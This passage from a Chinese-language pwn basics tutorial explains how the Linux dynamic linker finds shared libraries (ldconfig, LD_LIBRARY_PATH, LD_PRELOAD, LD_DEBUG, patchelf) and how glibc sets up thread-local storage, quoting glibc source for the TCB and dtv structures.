<p>如果动态链接器在每次查找共享库时都去遍历这些目录，那将会非常耗费时间。所以 Linux 系统中都有一个叫做 <code>ldconfig</code> 的程序，这个程序的作用是为共享库目录下的各个共享库创建、删除或更新相应的 SO-NAME（即相应的符号链接），这样每个共享库的 SO-NAME 就能够指向正确的共享库文件；并且这个程序还会将这些 SO-NAME 收集起来，集中存放到 <code>/etc/ld.so.cache</code> 文件里面，并建立一个 SO-NAME 的缓存。当动态链接器要查找共享库时，它可以直接从 <code>/etc/ld.so.cache</code> 里面查找。而 <code>/etc/ld.so.cache</code> 的结构是经过特殊设计的，非常适合查找，所以这个设计大大加快了共享库的查找过程。</p>
<p>如果动态链接器在 <code>/etc/ld.so.cache</code> 里面没有找到所需要的共享库，那么它还会遍历 <code>/lib</code> 和 <code>/usr/lib</code> 这两个目录，如果还是没找到，就宣告失败。</p>
<p>所以理论上讲，如果我们在系统指定的共享库目录下添加、删除或更新任何一个共享库，或者我们更改了 <code>/etc/ld.so.conf</code> 的配置，都应该运行 <code>ldconfig</code> 这个程序，以便调整 SO-NAME 和 <code>/etc/ld.so.cache</code> 。很多软件包的安装程序在往系统里面安装共享库以后都会调用 <code>ldconfig</code> 。</p>
<h2 id="更改共享库"><a href="#更改共享库" class="headerlink" title="更改共享库"></a>更改共享库</h2><p>Linux 系统提供了很多方法来改变动态链接器装载共享库路径的方法，通过使用这些方法，我们可以满足一些特殊的需求，比如共享库的调试和测试、应用程序级别的虚拟等。</p>
<h3 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h3><p>在 Linux 系统中，<code>LD_LIBRARY_PATH</code> 是一个由若干个路径组成的环境变量，每个路径之间由冒号隔开。默认情况下， <code>LD_LIBRARY_PATH</code> 为空。如果我们为某个进程设置了 <code>LD_LIBRARY_PATH</code> ，那么进程在启动时，动态链接器在查找共享库时，会首先查找由 <code>LD_LIBRARY_PATH</code> 指定的目录。这个环境变量可以很方便地让我们测试新的共享库或使用非标准的共享库。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的 pwntools 脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">sh = process(<span class="string">&quot;./lib/ld.so --preload libdl.so.2 ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>: <span class="string">&quot;./lib/&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>系统中另外还有一个环境变量叫做 <code>LD_PRELOAD</code> ，这个文件中我们可以指定预先装载的一些共享库甚或是目标文件。在 <code>LD_PRELOAD</code> 里面指定的文件会在动态链接器按照固定规则搜索共享库之前装载，它比 <code>LD_LIBRARY_PATH</code> 里面所指定的目录中的共享库还要优先。无论程序是否依赖于它们，<code>LD_PRELOAD</code> 里面指定的共享库或目标文件都会被装载。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的 pwntools 脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">process(<span class="string">&quot;./lib/ld.so ./pwnhub&quot;</span>.split(), env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./lib/libc.so.6 ./lib/libdl.so.2&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>
<h3 id="LD-DEBUG"><a href="#LD-DEBUG" class="headerlink" title="LD_DEBUG"></a>LD_DEBUG</h3><p>另外还有一个非常有用的环境变量 <code>LD_DEBUG</code> ，这个变量可以打开动态链接器的调试功能，当我们设置这个变量时，动态链接器会在运行时打印出各种有用的信息，对于我们开发和调试共享库有很大的帮助。</p>
<p>例如运行 <code>LD_DEBUG=files /bin/ls</code> 命令时动态链接器打印出了整个装载过程，显示程序依赖于哪个共享库并且按照什么步骤装载和初始化，共享库装载时的地址等。</p>
<ul>
<li><code>bindings</code>：显示动态链接的符号绑定过程。</li>
<li><code>libs</code>：显示共享库的查找过程。</li>
<li><code>versions</code>：显示符号的版本依赖关系。</li>
<li><code>reloc</code>：显示重定位过程。</li>
<li><code>symbols</code>：显示符号表查找过程。</li>
<li><code>statistics</code>：显示动态链接过程中的各种统计信息。</li>
</ul>
<h3 id="patchelf-1"><a href="#patchelf-1" class="headerlink" title="patchelf"></a>patchelf</h3><p>用于对于依赖不是很复杂的程序更换 libc ，有一下几点需要注意：</p>
<ul>
<li>如果在漏洞利用时用到了动态链接相关结构最好不要 patchelf，因为 patchelf 会改变动态链接相关结构的位置。</li>
<li>一个程序在一个版本的虚拟机里面 patchelf 后换到另一个版本虚拟机中可能会运行失败。</li>
<li>在 patch 完 libc 后最好把 ld 也 patch 成大版本相同的 ld ，否则会运行失败。</li>
</ul>
<p>修改 libc：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br></pre></td></tr></table></figure></div>
<p>修改 ld：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-2.31.so ./pwn</span><br></pre></td></tr></table></figure></div>
<h1 id="多线程与-TLS"><a href="#多线程与-TLS" class="headerlink" title="多线程与 TLS"></a>多线程与 TLS</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>线程的访问非常自由，它可以访问进程内存里的所有数据，甚至包括其他线程的堆栈（如果它知道其他线程的堆栈地址，那么这就是很少见的情况），但实际运用中线程也拥有自己的私有存储空间，包括以下几方面：</p>
<ul>
<li>栈（尽管并非完全无法被其他线程访问，但一般情况下仍然可以认为是私有的数据）。</li>
<li>线程局部存储（Thread Local Storage, TLS）。线程局部存储是某些操作系统为线程单独提供的私有空间，但通常只具有很有限的容量。</li>
<li>寄存器（包括PC寄存器），寄存器是执行流的基本数据，因此为线程私有。</li>
</ul>
<p>实际上，线程私有的数据有：</p>
<ul>
<li>局部变量</li>
<li>函数的参数</li>
<li><strong>TLS 数据</strong></li>
</ul>
<p>线程共享的数据有：</p>
<ul>
<li>全局变量</li>
<li>堆上的数据</li>
<li>函数里的静态变量</li>
<li>程序代码，任何线程都有有权利读取并执行任何代码。</li>
<li>打开的文件，A 线程打开的文件可以由 B 线程读写。</li>
</ul>
<p>一个<strong>全局变量</strong>如果使用 <code>__thread</code> 关键字修饰，那么这个变量就变成线程私有的 <strong>TLS 数据</strong>，也就是说每个线程都在自己所属 TLS 中单独保存一份这个变量的副本。例如下面的代码中，<code>a</code> 和 <code>b</code> 都是 TLS 数据，而 <code>c</code> 是全局变量。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -g -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">uint32_t</span> a = <span class="number">0x114514</span>;</span><br><span class="line">__thread <span class="type">uint32_t</span> b;</span><br><span class="line"><span class="type">uint32_t</span> c = <span class="number">0x1919810</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    a = <span class="number">0x12345678</span>;</span><br><span class="line">    b = <span class="number">0x87654321</span>;</span><br><span class="line">    c = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread: a(%p) = %x, b(%p) = %x, c(%p) = %x\n&quot;</span>, &amp;a, a, &amp;b, b, &amp;c, c);</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec78f0738) = 12345678, b(0x7f1ec78f073c) = 87654321, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">thread: a(0x7f1ec70ed6f8) = 114514, b(0x7f1ec70ed6fc) = 0, c(0x562d7468a010) = deadbeef</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
<p>分析生成的 ELF 文件的节表，发现多出了 <code>.tdata</code> 和 <code>.tbss</code> ，这两个节分别记录已初始化和未初始化的 TLS 数据。</p>
<p>其中 <code>.tbss</code> 在 ELF 文件中不占用空间， <code>.tdata</code> 在 ELF 中存储了初始化的数据，比如上面的代码中的 <code>__thread uint32_t a = 0x114514</code> 。</p>
<p>ELF 加载到内存中后， <code>.tdata</code> 和 <code>.tbss</code> 这两个节合并为一个段，在程序头表中这个段的 <code>p_type</code> 为 <code>PT_TLS(7)</code> 。</p>
<p>TLS（Thread Local Storage）的结构与 TCB（Thread Control Block）以及 dtv（dynamic thread vector）密切相关，每一个线程中每一个使用了 TLS 功能的模块都拥有一个 TLS Block 。这几者的关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005249673.png"
                      alt="image-20241108005249673"
                ></p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>这里是 x86_64-ABI 要求的 TLS 结构，Glibc 实现的 TLS 结构与上图有一些差异。</p>

    </div>
  </div>

<p>根据图中显示的信息，TLS Blocks 可以分为两类：</p>
<ul>
<li>一类是程序装载时就已经存在的（位于 TCB 前），这一部分 Block 被称为 <code>_static TLS_</code> 。</li>
<li>一类是右边的 Blocks 是动态分配的，它们被使用 <code>dlopen</code> 函数在程序运行时动态装载的模块所使用。</li>
</ul>
<p>TCB 作为线程控制块，保存着 <code>dtv</code> 数组的入口，<code>dtv</code> 数组中的每一项都是 TLS Block 的入口，它们是指向 TLS Blocks 的指针。特别的，<code>dtv</code> 数组的第一个成员是一个计数器，每当程序使用 <code>dlopen</code> 函数或者 <code>dlfree</code> 函数加载或者卸载一个具备 TLS 变量的模块，该计数器的值都会加一，从而保证程序内版本的一致性。 特别的，ELF 文件本身对应的 TLS Block 一定在 <code>dtv</code> 数组中占据索引为 1 的位置，且位置上与 TCB 相邻。 还需要注意的是，图中出现了一个名为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>p</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">tp_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的指针，在 i386 架构上，这个指针为 gs 段寄存器；在 x86_64 架构上，该指针为 fs 段寄存器。由于该指针与 ELF 文件本身对应的 TLS Block 之间的偏移是固定的，程序在编译时就可以将 ELF 中线程变量的地址硬编码到目标文件中。</p>
<h2 id="主线程-TLS-初始化"><a href="#主线程-TLS-初始化" class="headerlink" title="主线程 TLS 初始化"></a>主线程 TLS 初始化</h2><p>前面提到过在 <code>main</code> 开始前会调用 <code>__libc_setup_tls</code> 初始化 TLS 。</p>
<p>在 <code>__libc_setup_tls</code> 函数中，首先会遍历 ELF 的程序头表，找到 <code>p_type</code> 为 <code>PT_TLS(7)</code> 的段，这个段中就存储着 TLS 的初始化数据。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Look through the TLS segment if there is any.  */</span></span><br><span class="line"><span class="keyword">if</span> (_dl_phdr != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">for</span> (phdr = _dl_phdr; phdr &lt; &amp;_dl_phdr[_dl_phnum]; ++phdr)</span><br><span class="line">        <span class="keyword">if</span> (phdr-&gt;p_type == PT_TLS) &#123;</span><br><span class="line">            <span class="comment">/* Remember the values we need.  */</span></span><br><span class="line">            memsz = phdr-&gt;p_memsz;</span><br><span class="line">            filesz = phdr-&gt;p_filesz;</span><br><span class="line">            initimage = (<span class="type">void</span> *) phdr-&gt;p_vaddr + main_map-&gt;l_addr;</span><br><span class="line">            align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">if</span> (phdr-&gt;p_align &gt; max_align)</span><br><span class="line">                max_align = phdr-&gt;p_align;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后通过 <code>brk</code> 调用为 TLS 中的数据以及一个 <code>pthread</code> 结构体分配内存。其中 <code>pthread</code> 结构体的第一项为 <code>tcbhead_t header;</code> ，即前面提到的 <strong>TCB</strong> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Align the TCB offset to the maximum alignment, as</span></span><br><span class="line"><span class="comment">   _dl_allocate_tls_storage (in elf/dl-tls.c) does using __libc_memalign</span></span><br><span class="line"><span class="comment">   and dl_tls_static_align.  */</span></span><br><span class="line">tcb_offset = roundup (memsz + GLRO(dl_tls_static_surplus), max_align);</span><br><span class="line">tlsblock = __sbrk(tcb_offset + TLS_INIT_TCB_SIZE + max_align);</span><br></pre></td></tr></table></figure></div>
<p><code>tcbhead_t</code> 结构体定义如下，也就是很多资料中提到的 TLS 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *tcb;		<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">			   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;		<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __ASSUME_PRIVATE_FUTEX</span></span><br><span class="line">  <span class="type">int</span> private_futex;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_reserved1;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> __glibc_reserved2;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>
<p>之后初始化 <code>_dl_static_dtv</code> ，也就是前面提到的 <strong><code>dtv</code> 数组</strong>，具体过程为：</p>
<ul>
<li>将 <code>tlsblock</code> 地址关于 <code>max_align</code> 向上对齐。</li>
<li><code> _dl_static_dtv[0].counter</code> 初始化为 <code>dtv</code> 的数量，由于 <code>_dl_static_dtv</code> 前两项分别用于记录 <code>dtv</code> 总数和使用的数量，因此这里记录的 <code>dtv</code> 数量是要减去这两项的。</li>
<li><code> _dl_static_dtv[1].counter</code> 初始化为 0 。</li>
<li><code>_dl_static_dtv[2]</code> 也就是当前模块对应的 <code>dtv</code> 的 <code>pointer.val</code> 指向 TLS 。</li>
<li><code>_dl_static_dtv[2].pointer.to_free</code> 置为 NULL 。</li>
<li>将 TLS 的初始数据也就是 <code>PT_TLS</code> 段中的数据复制到 TLS 中。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *val;                    <span class="comment">/* Pointer to data, or TLS_DTV_UNALLOCATED.  */</span></span><br><span class="line">  <span class="type">void</span> *to_free;                <span class="comment">/* Unaligned pointer, for deallocation.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type for the dtv.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">dtv</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> counter;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtv_pointer</span> <span class="title">pointer</span>;</span></span><br><span class="line">&#125; <span class="type">dtv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Number of additional entries in the slotinfo array of each slotinfo</span></span><br><span class="line"><span class="comment">   list element.  A large number makes it almost certain take we never</span></span><br><span class="line"><span class="comment">   have to iterate beyond the first element in the slotinfo list.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TLS_SLOTINFO_SURPLUS (62)</span></span><br><span class="line"><span class="type">dtv_t</span> _dl_static_dtv[<span class="number">2</span> + TLS_SLOTINFO_SURPLUS];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Align the TLS block.  */</span></span><br><span class="line">    tlsblock = (<span class="type">void</span> *) (((<span class="type">uintptr_t</span>) tlsblock + max_align - <span class="number">1</span>)</span><br><span class="line">                         &amp; ~(max_align - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the dtv.  [0] is the length, [1] the generation counter.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">0</span>].counter = (<span class="keyword">sizeof</span>(_dl_static_dtv) / <span class="keyword">sizeof</span>(_dl_static_dtv[<span class="number">0</span>])) - <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// _dl_static_dtv[1].counter = 0;		would be needed if not already done</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the TLS block.  */</span></span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.val = ((<span class="type">char</span> *) tlsblock + tcb_offset</span><br><span class="line">                                     - roundup (memsz, align ?: <span class="number">1</span>));</span><br><span class="line">    _dl_static_dtv[<span class="number">2</span>].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* sbrk gives us zero&#x27;d memory, so we don&#x27;t need to clear the remainder.  */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(_dl_static_dtv[<span class="number">2</span>].pointer.val, initimage, filesz);</span><br></pre></td></tr></table></figure></div>
此时 TLS 相关结构之间的关系如下图所示：</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005415665.png"
                      alt="image-20241108005415665"
                ><br>另外还会初始化 <code>link_map</code> 中的 TLS 相关的数据，由此我们可以知道 <code>link_map</code> 中这些字段的含义：</p>
<ul>
<li><code>l_tls_offset </code>：TCB 在 TLS 中的偏移。</li>
<li><code>l_tls_align</code>：TLS 初始数据的对齐，在 TLS 中 TLS 初始数据关于 <code>l_tls_align</code> 向上取整。</li>
<li><code>l_tls_blocksize</code>：TLS 初始数据的大小，也就是前面提到的 TLS Block 的大小。</li>
<li><code>l_tls_initimage</code>：TLS 初始数据的地址。也就是 <code>PT_TLS</code> 段的地址。</li>
<li><code>l_tls_initimage_size</code>：<code>PT_TLS</code> 段在文件中的大小，也就是 <code>.tdata</code> 的大小。</li>
<li><code>l_tls_modid</code>：模块编号。</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">main_map</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line">main_map-&gt;l_tls_offset = roundup (memsz, align ?: <span class="number">1</span>);</span><br><span class="line"><span class="comment">/* Update the executable&#x27;s link map with enough information to make</span></span><br><span class="line"><span class="comment">   the TLS routines happy.  */</span></span><br><span class="line">main_map-&gt;l_tls_align = align;</span><br><span class="line">main_map-&gt;l_tls_blocksize = memsz;</span><br><span class="line">main_map-&gt;l_tls_initimage = initimage;</span><br><span class="line">main_map-&gt;l_tls_initimage_size = filesz;</span><br><span class="line">main_map-&gt;l_tls_modid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<h2 id="创建线程时-TLS-初始化"><a href="#创建线程时-TLS-初始化" class="headerlink" title="创建线程时 TLS 初始化"></a>创建线程时 TLS 初始化</h2><p>创建线程的函数 <code>pthread_create</code> 实际调用的是 <code>__pthread_create_2_1</code> 函数，在该函数中调用了 <code>allocate_stack</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> ALLOCATE_STACK(attr, pd) allocate_stack (attr, pd, &amp;stackaddr)</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err = ALLOCATE_STACK (iattr, &amp;pd);</span><br></pre></td></tr></table></figure></div>
<p>在 <code>allocate_stack</code> 函数中会调用 <code>mmap</code> 为线程分配栈空间，然后初始化栈底为一个 <code>pthread</code> 结构体并将指针 <code>pd</code> 指向该结构体。最后调用 <code>_dl_allocate_tls</code> 函数为 TCB 创建 <code>dtv</code> 数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">pd</span>;</span></span><br><span class="line">...</span><br><span class="line">  mem = __mmap (<span class="literal">NULL</span>, size, (guardsize == <span class="number">0</span>) ? prot : PROT_NONE,</span><br><span class="line">	MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  ...</span><br><span class="line">  pd = (<span class="keyword">struct</span> pthread *) ((((<span class="type">uintptr_t</span>) mem + size) - TLS_TCB_SIZE) &amp; ~__static_tls_align_m1);</span><br><span class="line">...</span><br><span class="line">_dl_allocate_tls (TLS_TPADJ (pd))</span><br></pre></td></tr></table></figure></div>
<p><code>_dl_allocate_tls </code> 函数依次调用 <code>allocate_dtv</code> 和 <code>_dl_allocate_tls_init</code> 分配和初始化 <code>dtv</code> 数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">_dl_allocate_tls (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _dl_allocate_tls_init (mem == <span class="literal">NULL</span></span><br><span class="line">				? _dl_allocate_tls_storage ()</span><br><span class="line">				: allocate_dtv (mem));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>allocate_dtv</code> 函数调用了 ptmalloc 堆管理器的 <code>calloc</code> 函数为 <code>dtv</code> 数组分配内存，初始化 <code>dtv[0].counter</code> 为数组中元素数量，并且让 <code>pd-&gt;dtv</code> 指向 <code>dtv[1]</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Install the dtv pointer.  The pointer passed is to the element with</span></span><br><span class="line"><span class="comment">   index -1 which contain the length.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> INSTALL_DTV(descr, dtvp) \</span></span><br><span class="line"><span class="meta">  ((tcbhead_t *) (descr))-&gt;dtv = (dtvp) + 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">allocate_dtv</span> <span class="params">(<span class="type">void</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">size_t</span> dtv_length;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We allocate a few more elements in the dtv than are needed for the</span></span><br><span class="line"><span class="comment">     initial set of modules.  This should avoid in most cases expansions</span></span><br><span class="line"><span class="comment">     of the dtv.  */</span></span><br><span class="line">  dtv_length = GL(dl_tls_max_dtv_idx) + DTV_SURPLUS;</span><br><span class="line">  dtv = <span class="built_in">calloc</span> (dtv_length + <span class="number">2</span>, <span class="keyword">sizeof</span> (<span class="type">dtv_t</span>));</span><br><span class="line">  <span class="keyword">if</span> (dtv != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is the initial length of the dtv.  */</span></span><br><span class="line">      dtv[<span class="number">0</span>].counter = dtv_length;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The rest of the dtv (including the generation counter) is</span></span><br><span class="line"><span class="comment">	 Initialize with zero to indicate nothing there.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Add the dtv to the thread data structures.  */</span></span><br><span class="line">      INSTALL_DTV (result, dtv);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>_dl_allocate_tls_init</code> 函数会遍历 <code>dl_tls_dtv_slotinfo_list</code> 中的 <code>link_map</code> ，初始化 <code>dtv</code> 数组并将初始数据复制到 TLS 变量中。<strong>从这里可以看出，如果一个模块有 TLS 变量，则该模块对应的 <code>dtv-&gt;pointer.val</code> 指向 TLS 变量的起始地址。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = TLS_DTV_UNALLOCATED;</span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.to_free = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_tls_offset == NO_TLS_OFFSET</span><br><span class="line">    || <span class="built_in">map</span>-&gt;l_tls_offset == FORCED_DYNAMIC_TLS_OFFSET)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Set up the DTV entry.  The simplified __tls_get_addr that</span></span><br><span class="line"><span class="comment">   some platforms use in static programs requires it.  */</span></span><br><span class="line">dtv[<span class="built_in">map</span>-&gt;l_tls_modid].pointer.val = dest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Copy the initialization image and clear the BSS part.  */</span></span><br><span class="line"><span class="built_in">memset</span>(__mempcpy (dest, <span class="built_in">map</span>-&gt;l_tls_initimage,</span><br><span class="line">                  <span class="built_in">map</span>-&gt;l_tls_initimage_size), <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">       <span class="built_in">map</span>-&gt;l_tls_blocksize - <span class="built_in">map</span>-&gt;l_tls_initimage_size);</span><br></pre></td></tr></table></figure></div>
<p>回到 <code>__pthread_create_2_1</code> 函数，在完成了 <code>pthread</code> 的一系列初始化后调用了 <code>THREAD_COPY_STACK_GUARD</code> 和 <code>THREAD_COPY_POINTER_GUARD</code> 两个宏，这两个宏的展开如下：</p>
